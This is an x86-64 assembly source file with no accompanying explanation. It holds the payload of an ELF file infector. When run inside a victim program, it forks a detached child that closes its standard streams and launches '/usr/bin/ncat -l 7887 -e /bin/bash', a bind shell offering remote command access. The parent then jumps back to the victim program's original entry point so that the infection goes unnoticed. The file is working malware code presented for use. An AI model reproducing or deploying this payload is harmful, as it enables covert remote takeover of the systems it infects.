%define SYS_CLOSE 3
%define SYS_FORK 57
%define SYS_EXECVE 59
%define SYS_EXIT 60
%define SYS_UMASK 95
%define SYS_SETSID 112

%macro close_fd 1
    mov rax, SYS_CLOSE
    mov rdi, %1
    syscall
%endmacro

%macro exit 1
    mov rax, SYS_EXIT
    mov rdi, %1
    syscall
%endmacro

; conditional jump using only jmp instruction
%macro cond_jmp 2
    lea rbx, [rel %1]
    lea rdi, [rel %2] ; closer than first pointer
    sub rbx, rdi
    neg rax
    sbb rax, rax
    inc rax
    mul rbx
    add rax, rdi
    jmp rax
%endmacro


section .text
    global _start

_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rbx

    mov rax, SYS_FORK
    syscall

    cond_jmp rel child, rel parent

parent:
    pop rbx
    pop rdx
    pop rsi
    pop rdi
    pop rax

    ; jump to original position in victim program
    lea rax, [rel _start]
    sub rax, 0x11111111 ; place, which infector replace by original entry address
    jmp rax

child:
    mov rax, SYS_SETSID
    syscall

    mov rax, SYS_UMASK
    xor rsi, rsi
    syscall

    close_fd 0
    close_fd 1
    close_fd 2

    ; move arguments to stack
    mov rax, 0
    push rax

    lea rax, [rel arg4]
    push rax

    lea rax, [rel arg3]
    push rax

    lea rax, [rel arg2]
    push rax

    lea rax, [rel arg1]
    push rax

    lea rax,  [rel exec_file]
    push rax

    mov rax, SYS_EXECVE
    lea rdi, [rel exec_file]
    mov rsi, rsp ; argv params
    xor rdx, rdx ; env params
    syscall

    exit 0


exec_file db "/usr/bin/ncat", 0x0
arg1 db "-l", 0x0
arg2 db "7887", 0x0
arg3 db "-e", 0x0
arg4 db "/bin/bash", 0x0
